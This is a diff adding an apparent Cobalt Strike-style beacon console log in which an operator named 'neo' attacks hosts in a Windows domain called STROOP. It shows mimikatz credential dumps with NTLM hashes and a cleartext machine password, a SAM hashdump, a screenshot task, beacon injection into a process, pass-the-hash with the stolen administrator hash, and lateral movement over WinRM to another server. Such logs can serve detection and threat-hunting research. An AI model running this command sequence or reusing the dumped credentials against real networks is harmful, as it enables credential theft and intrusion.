@@ -1,0 +1,660 @@
+03/30 09:04:07 UTC [metadata] beacon_1282172642 -> 10.1.4.10; computer: L-WIN227; user: SYSTEM *; process: rundll32.exe; pid: 3284; os: Windows; version: 10.0; beacon arch: x64 (x64)
+03/30 09:04:07 UTC [output]
+established link to parent beacon: 10.1.3.11
+
+03/30 09:04:16 UTC [input] <neo> logonpasswords
+03/30 09:04:16 UTC [task] <T1003, T1055, T1093> Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+03/30 09:04:17 UTC [checkin] host called home, sent: 417362 bytes
+03/30 09:04:18 UTC [output]
+received output:
+
+Authentication Id : 0 ; 1204847 (00000000:0012626f)
+Session           : RemoteInteractive from 2
+User Name         : ADMIN-w.trommel
+Domain            : STROOP
+Logon Server      : S-WIN21
+Logon Time        : 3/30/2020 8:36:48 AM
+SID               : S-1-5-21-2163199188-2306780613-1636707950-4731
+	msv :	
+	 [00000003] Primary
+	 * Username : ADMIN-W.Trommel
+	 * Domain   : STROOP
+	 * NTLM     : e4a22d8e7bbec871b341c88c2e94cba2
+	 * SHA1     : e4d319d431fc5f20f9b459d40870854c840834d7
+	 * DPAPI    : 084184796699243227158b41c2c4a96a
+	tspkg :	
+	wdigest :	
+	 * Username : ADMIN-W.Trommel
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : ADMIN-W.Trommel
+	 * Domain   : STROOP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1200018 (00000000:00124f92)
+Session           : RemoteInteractive from 2
+User Name         : ADMIN-w.trommel
+Domain            : STROOP
+Logon Server      : S-WIN21
+Logon Time        : 3/30/2020 8:36:48 AM
+SID               : S-1-5-21-2163199188-2306780613-1636707950-4731
+	msv :	
+	 [00000003] Primary
+	 * Username : ADMIN-W.Trommel
+	 * Domain   : STROOP
+	 * NTLM     : e4a22d8e7bbec871b341c88c2e94cba2
+	 * SHA1     : e4d319d431fc5f20f9b459d40870854c840834d7
+	 * DPAPI    : 084184796699243227158b41c2c4a96a
+	tspkg :	
+	wdigest :	
+	 * Username : ADMIN-W.Trommel
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : ADMIN-w.trommel
+	 * Domain   : STROOP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1171434 (00000000:0011dfea)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/30/2020 8:36:48 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * NTLM     : 6c3efa2c8e5131ce090ca83175b2dbb1
+	 * SHA1     : c97a31132db6a1b422870ced42e97c337c542627
+	tspkg :	
+	wdigest :	
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : L-WIN227$
+	 * Domain   : stroop.local
+	 * Password : hTHDWrB.P5[8!,wEBB&CJM&W!c;V)[ae#3:C&9h87uD?4;[1Z7_5!:Z1t%"-^+jt0*.i#Ccq^0@wL)F'QRJSl<-j3_K1MYV!!52M1'EyIhjdjyyTb5Up7''M
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1170989 (00000000:0011de2d)
+Session           : Interactive from 2
+User Name         : DWM-2
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/30/2020 8:36:48 AM
+SID               : S-1-5-90-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * NTLM     : 6c3efa2c8e5131ce090ca83175b2dbb1
+	 * SHA1     : c97a31132db6a1b422870ced42e97c337c542627
+	tspkg :	
+	wdigest :	
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : L-WIN227$
+	 * Domain   : stroop.local
+	 * Password : hTHDWrB.P5[8!,wEBB&CJM&W!c;V)[ae#3:C&9h87uD?4;[1Z7_5!:Z1t%"-^+jt0*.i#Ccq^0@wL)F'QRJSl<-j3_K1MYV!!52M1'EyIhjdjyyTb5Up7''M
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 1170133 (00000000:0011dad5)
+Session           : Interactive from 2
+User Name         : UMFD-2
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/30/2020 8:36:48 AM
+SID               : S-1-5-96-0-2
+	msv :	
+	 [00000003] Primary
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * NTLM     : 6c3efa2c8e5131ce090ca83175b2dbb1
+	 * SHA1     : c97a31132db6a1b422870ced42e97c337c542627
+	tspkg :	
+	wdigest :	
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : L-WIN227$
+	 * Domain   : stroop.local
+	 * Password : hTHDWrB.P5[8!,wEBB&CJM&W!c;V)[ae#3:C&9h87uD?4;[1Z7_5!:Z1t%"-^+jt0*.i#Ccq^0@wL)F'QRJSl<-j3_K1MYV!!52M1'EyIhjdjyyTb5Up7''M
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 3/30/2020 7:46:05 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 51952 (00000000:0000caf0)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/30/2020 7:46:05 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * NTLM     : 6c3efa2c8e5131ce090ca83175b2dbb1
+	 * SHA1     : c97a31132db6a1b422870ced42e97c337c542627
+	tspkg :	
+	wdigest :	
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : L-WIN227$
+	 * Domain   : stroop.local
+	 * Password : hTHDWrB.P5[8!,wEBB&CJM&W!c;V)[ae#3:C&9h87uD?4;[1Z7_5!:Z1t%"-^+jt0*.i#Ccq^0@wL)F'QRJSl<-j3_K1MYV!!52M1'EyIhjdjyyTb5Up7''M
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 51837 (00000000:0000ca7d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 3/30/2020 7:46:05 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * NTLM     : 6c3efa2c8e5131ce090ca83175b2dbb1
+	 * SHA1     : c97a31132db6a1b422870ced42e97c337c542627
+	tspkg :	
+	wdigest :	
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : L-WIN227$
+	 * Domain   : stroop.local
+	 * Password : hTHDWrB.P5[8!,wEBB&CJM&W!c;V)[ae#3:C&9h87uD?4;[1Z7_5!:Z1t%"-^+jt0*.i#Ccq^0@wL)F'QRJSl<-j3_K1MYV!!52M1'EyIhjdjyyTb5Up7''M
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : L-WIN227$
+Domain            : STROOP
+Logon Server      : (null)
+Logon Time        : 3/30/2020 7:46:05 AM
+SID               : S-1-5-20
+	msv :	
+	 [00000003] Primary
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * NTLM     : 6c3efa2c8e5131ce090ca83175b2dbb1
+	 * SHA1     : c97a31132db6a1b422870ced42e97c337c542627
+	tspkg :	
+	wdigest :	
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : l-win227$
+	 * Domain   : STROOP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 29657 (00000000:000073d9)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/30/2020 7:46:05 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	 [00000003] Primary
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * NTLM     : 6c3efa2c8e5131ce090ca83175b2dbb1
+	 * SHA1     : c97a31132db6a1b422870ced42e97c337c542627
+	tspkg :	
+	wdigest :	
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : L-WIN227$
+	 * Domain   : stroop.local
+	 * Password : hTHDWrB.P5[8!,wEBB&CJM&W!c;V)[ae#3:C&9h87uD?4;[1Z7_5!:Z1t%"-^+jt0*.i#Ccq^0@wL)F'QRJSl<-j3_K1MYV!!52M1'EyIhjdjyyTb5Up7''M
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 29612 (00000000:000073ac)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 3/30/2020 7:46:05 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	 [00000003] Primary
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * NTLM     : 6c3efa2c8e5131ce090ca83175b2dbb1
+	 * SHA1     : c97a31132db6a1b422870ced42e97c337c542627
+	tspkg :	
+	wdigest :	
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : L-WIN227$
+	 * Domain   : stroop.local
+	 * Password : hTHDWrB.P5[8!,wEBB&CJM&W!c;V)[ae#3:C&9h87uD?4;[1Z7_5!:Z1t%"-^+jt0*.i#Ccq^0@wL)F'QRJSl<-j3_K1MYV!!52M1'EyIhjdjyyTb5Up7''M
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 28303 (00000000:00006e8f)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 3/30/2020 7:46:05 AM
+SID               : 
+	msv :	
+	 [00000003] Primary
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * NTLM     : 6c3efa2c8e5131ce090ca83175b2dbb1
+	 * SHA1     : c97a31132db6a1b422870ced42e97c337c542627
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : L-WIN227$
+Domain            : STROOP
+Logon Server      : (null)
+Logon Time        : 3/30/2020 7:46:05 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : L-WIN227$
+	 * Domain   : STROOP
+	 * Password : (null)
+	kerberos :	
+	 * Username : l-win227$
+	 * Domain   : STROOP.LOCAL
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+
+03/30 09:04:20 UTC [input] <neo> ps
+03/30 09:04:20 UTC [task] <T1057> Tasked beacon to list processes
+03/30 09:04:23 UTC [checkin] host called home, sent: 12 bytes
+03/30 09:04:23 UTC [output]
+[System Process]	0	0
+System	0	4	x64	NT AUTHORITY\SYSTEM	0
+Registry	4	88	x64	NT AUTHORITY\SYSTEM	0
+smss.exe	4	404	x64	NT AUTHORITY\SYSTEM	0
+csrss.exe	492	512	x64	NT AUTHORITY\SYSTEM	0
+wininit.exe	492	588	x64	NT AUTHORITY\SYSTEM	0
+csrss.exe	580	596	x64	NT AUTHORITY\SYSTEM	1
+winlogon.exe	580	684	x64	NT AUTHORITY\SYSTEM	1
+services.exe	588	696	x64	NT AUTHORITY\SYSTEM	0
+lsass.exe	588	732	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	832	x64	NT AUTHORITY\SYSTEM	0
+fontdrvhost.exe	588	844	x64	Font Driver Host\UMFD-0	0
+fontdrvhost.exe	684	852	x64	Font Driver Host\UMFD-1	1
+svchost.exe	696	920	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	968	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	1012	x64	NT AUTHORITY\SYSTEM	0
+LogonUI.exe	684	584	x64	NT AUTHORITY\SYSTEM	1
+dwm.exe	684	652	x64	Window Manager\DWM-1	1
+svchost.exe	696	1008	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1032	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	1052	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1064	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1172	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1192	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1208	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	1256	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1312	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1376	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1456	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1484	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1520	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1528	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1644	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1664	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	1692	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1700	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1784	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1792	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1908	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1924	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1976	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1988	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2008	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1120	x64	NT AUTHORITY\SYSTEM	0
+Memory Compression	4	2128	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2164	x64	NT AUTHORITY\SYSTEM	0
+VSSVC.exe	696	2200	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2224	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	2252	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2300	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2380	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2392	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2432	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2516	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2532	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	2548	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2612	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2628	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2700	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2792	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2868	x64	NT AUTHORITY\SYSTEM	0
+spoolsv.exe	696	3036	x64	NT AUTHORITY\SYSTEM	0
+OfficeClickToRun.exe	696	3156	x64	NT AUTHORITY\SYSTEM	0
+sysmon64.exe	696	3176	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3188	x64	NT AUTHORITY\NETWORK SERVICE	0
+WaAppAgent.exe	696	3196	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3204	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3216	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	3224	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3232	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	3256	x64	NT AUTHORITY\SYSTEM	0
+MsMpEng.exe	696	3288	x64	NT AUTHORITY\SYSTEM	0
+WindowsAzureGuestAgent.exe	696	3300	x64	NT AUTHORITY\SYSTEM	0
+WindowsAzureTelemetryService.exe	696	3348	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3376	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	3392	x64	NT AUTHORITY\SYSTEM	0
+unsecapp.exe	920	3728	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3928	x64	NT AUTHORITY\LOCAL SERVICE	0
+WmiPrvSE.exe	920	3312	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	4320	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	4744	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	4776	x64	NT AUTHORITY\SYSTEM	0
+taskhostw.exe	1256	4688	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2656	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	5428	x64	NT AUTHORITY\LOCAL SERVICE	0
+WaSecAgentProv.exe	3196	6060	x64	NT AUTHORITY\SYSTEM	0
+conhost.exe	6060	6088	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1076	x64	NT AUTHORITY\LOCAL SERVICE	0
+SgrmBroker.exe	696	5940	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	6068	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	5920	x64	NT AUTHORITY\LOCAL SERVICE	0
+SearchIndexer.exe	696	5636	x64	NT AUTHORITY\SYSTEM	0
+SecurityHealthService.exe	696	4104	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	5788	x64	NT AUTHORITY\SYSTEM	0
+csrss.exe	5132	4300	x64	NT AUTHORITY\SYSTEM	2
+winlogon.exe	5132	4592	x64	NT AUTHORITY\SYSTEM	2
+dwm.exe	4592	3272	x64	Window Manager\DWM-2	2
+fontdrvhost.exe	4592	5980	x64	Font Driver Host\UMFD-2	2
+rdpclip.exe	1032	5588	x64	STROOP\ADMIN-W.Trommel	2
+sihost.exe	1520	464	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	4388	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	1116	x64	STROOP\ADMIN-W.Trommel	2
+taskhostw.exe	1256	1748	x64	STROOP\ADMIN-W.Trommel	2
+powershell.exe	1256	1464	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	5652	x64	NT AUTHORITY\SYSTEM	0
+conhost.exe	1464	1684	x64	STROOP\ADMIN-W.Trommel	2
+ctfmon.exe	5652	1060	x64	STROOP\ADMIN-W.Trommel	2
+explorer.exe	4684	4632	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	372	x64	STROOP\ADMIN-W.Trommel	2
+ShellExperienceHost.exe	920	6160	x64	STROOP\ADMIN-W.Trommel	2
+SearchUI.exe	920	6276	x64	STROOP\ADMIN-W.Trommel	2
+RuntimeBroker.exe	920	6464	x64	STROOP\ADMIN-W.Trommel	2
+RuntimeBroker.exe	920	6568	x64	STROOP\ADMIN-W.Trommel	2
+powershell.exe	1464	6908	x64	STROOP\ADMIN-W.Trommel	2
+conhost.exe	6908	6916	x64	STROOP\ADMIN-W.Trommel	2
+powershell.exe	1464	7004	x64	STROOP\ADMIN-W.Trommel	2
+conhost.exe	7004	7012	x64	STROOP\ADMIN-W.Trommel	2
+RuntimeBroker.exe	920	2296	x64	STROOP\ADMIN-W.Trommel	2
+iexplore.exe	920	6376	x64	STROOP\ADMIN-W.Trommel	2
+iexplore.exe	6376	2320	x86	STROOP\ADMIN-W.Trommel	2
+smartscreen.exe	920	7204	x64	STROOP\ADMIN-W.Trommel	2
+SecurityHealthSystray.exe	4632	7248	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	7532	x64	NT AUTHORITY\SYSTEM	0
+LogonUI.exe	4592	3888	x64	NT AUTHORITY\SYSTEM	2
+dllhost.exe	920	3128	x64	STROOP\ADMIN-W.Trommel	2
+svchost.exe	696	4552	x64	STROOP\ADMIN-W.Trommel	2
+rundll32.exe	7372	3284	x64	NT AUTHORITY\SYSTEM	0
+
+
+03/30 09:04:25 UTC [input] <neo> hashdump
+03/30 09:04:25 UTC [task] <T1003, T1055, T1093> Tasked beacon to dump hashes
+03/30 09:04:28 UTC [checkin] host called home, sent: 82501 bytes
+03/30 09:04:28 UTC [input] <neo> screenshot
+03/30 09:04:28 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+03/30 09:04:29 UTC [output]
+received password hashes:
+bofh:500:aad3b435b51404eeaad3b435b51404ee:e2fb4576f49d1badae64eeb8cd050e19:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9480a886367fa07551dceadca7c741da:::
+
+
+03/30 09:04:34 UTC [checkin] host called home, sent: 197186 bytes
+03/30 09:06:30 UTC [input] <neo> inject 7248 x64 smb
+03/30 09:06:30 UTC [task] <T1055> Tasked beacon to inject windows/beacon_bind_pipe (\\.\pipe\msagent_2ebf) into 7248 (x64)
+03/30 09:06:32 UTC [checkin] host called home, sent: 255034 bytes
+03/30 09:06:33 UTC [output]
+established link to child beacon: 10.1.4.10
+
+03/30 09:10:36 UTC [input] <neo> rev2self
+03/30 09:10:36 UTC [task] <T1134> Tasked beacon to revert token
+03/30 09:10:36 UTC [input] <neo> pth STROOP\ADMIN-W.Trommel e4a22d8e7bbec871b341c88c2e94cba2
+03/30 09:10:36 UTC [task] <T1075, T1093> Tasked beacon to run mimikatz's sekurlsa::pth /user:ADMIN-W.Trommel /domain:STROOP /ntlm:e4a22d8e7bbec871b341c88c2e94cba2 /run:"%COMSPEC% /c echo 9f46f427eed > \\.\pipe\461092" command
+03/30 09:10:36 UTC [input] <neo> jump winrm64 S-WIN21 smb
+03/30 09:10:37 UTC [task] <T1028, T1086> Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_2ebf) on S-WIN21 via WinRM
+03/30 09:10:39 UTC [checkin] host called home, sent: 636639 bytes
+03/30 09:10:51 UTC [output]
+Impersonated NT AUTHORITY\SYSTEM
+
+03/30 09:10:51 UTC [output]
+established link to child beacon: 10.1.2.10
+
+03/30 09:10:51 UTC [output]
+received output:
+user	: ADMIN-W.Trommel
+domain	: STROOP
+program	: C:\windows\system32\cmd.exe /c echo 9f46f427eed > \\.\pipe\461092
+impers.	: no
+NTLM	: e4a22d8e7bbec871b341c88c2e94cba2
+  |  PID  8096
+  |  TID  2676
+  |  LSA Process is now R/W
+  |  LUID 0 ; 2184206 (00000000:0021540e)
+  \_ msv1_0   - data copy @ 0000015374FA4E80 : OK !
+  \_ kerberos - data copy @ 0000015374EF5418
+   \_ aes256_hmac       -> null             
+   \_ aes128_hmac       -> null             
+   \_ rc4_hmac_nt       OK
+   \_ rc4_hmac_old      OK
+   \_ rc4_md4           OK
+   \_ rc4_hmac_nt_exp   OK
+   \_ rc4_hmac_old_exp  OK
+   \_ *Password replace @ 0000015374E3F408 (32) -> null
+
+
+03/30 09:10:51 UTC [output]
+received output:
+#< CLIXML
+
+
+03/30 09:20:39 UTC [input] <neo> sleep 30
+03/30 09:20:39 UTC [task] <> Tasked beacon to sleep for 30s [change made to: Beacon 10.1.3.11@4164]
+03/30 09:35:27 UTC [input] <neo> ps
+03/30 09:35:27 UTC [task] <T1057> Tasked beacon to list processes
+03/30 09:35:43 UTC [checkin] host called home, sent: 36 bytes
+03/30 09:35:43 UTC [output]
+[System Process]	0	0
+System	0	4	x64	NT AUTHORITY\SYSTEM	0
+Registry	4	88	x64	NT AUTHORITY\SYSTEM	0
+smss.exe	4	404	x64	NT AUTHORITY\SYSTEM	0
+csrss.exe	492	512	x64	NT AUTHORITY\SYSTEM	0
+wininit.exe	492	588	x64	NT AUTHORITY\SYSTEM	0
+csrss.exe	580	596	x64	NT AUTHORITY\SYSTEM	1
+winlogon.exe	580	684	x64	NT AUTHORITY\SYSTEM	1
+services.exe	588	696	x64	NT AUTHORITY\SYSTEM	0
+lsass.exe	588	732	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	832	x64	NT AUTHORITY\SYSTEM	0
+fontdrvhost.exe	588	844	x64	Font Driver Host\UMFD-0	0
+fontdrvhost.exe	684	852	x64	Font Driver Host\UMFD-1	1
+svchost.exe	696	920	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	968	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	1012	x64	NT AUTHORITY\SYSTEM	0
+LogonUI.exe	684	584	x64	NT AUTHORITY\SYSTEM	1
+dwm.exe	684	652	x64	Window Manager\DWM-1	1
+svchost.exe	696	1008	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1032	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	1052	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1064	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1172	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1192	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1208	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	1256	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1312	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1376	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1456	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1484	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1520	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1528	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1644	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1664	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	1692	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1700	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1784	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1792	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1908	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1924	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1976	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	1988	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2008	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	1120	x64	NT AUTHORITY\SYSTEM	0
+Memory Compression	4	2128	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2164	x64	NT AUTHORITY\SYSTEM	0
+VSSVC.exe	696	2200	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2224	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	2252	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2300	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2380	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2392	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2432	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2516	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2532	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	2548	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2612	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2628	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	2700	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2792	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	2868	x64	NT AUTHORITY\SYSTEM	0
+spoolsv.exe	696	3036	x64	NT AUTHORITY\SYSTEM	0
+OfficeClickToRun.exe	696	3156	x64	NT AUTHORITY\SYSTEM	0
+sysmon64.exe	696	3176	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3188	x64	NT AUTHORITY\NETWORK SERVICE	0
+WaAppAgent.exe	696	3196	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3204	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3216	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	3224	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3232	x64	NT AUTHORITY\LOCAL SERVICE	0
+svchost.exe	696	3256	x64	NT AUTHORITY\SYSTEM	0
+MsMpEng.exe	696	3288	x64	NT AUTHORITY\SYSTEM	0
+WindowsAzureGuestAgent.exe	696	3300	x64	NT AUTHORITY\SYSTEM	0
+WindowsAzureTelemetryService.exe	696	3348	x64	NT AUTHORITY\SYSTEM	0
+svchost.exe	696	3376	x64	NT AUTHORITY\NETWORK SERVICE	0
+svchost.exe	696	3392	x64	NT AUTHORITY\SYSTEM	0
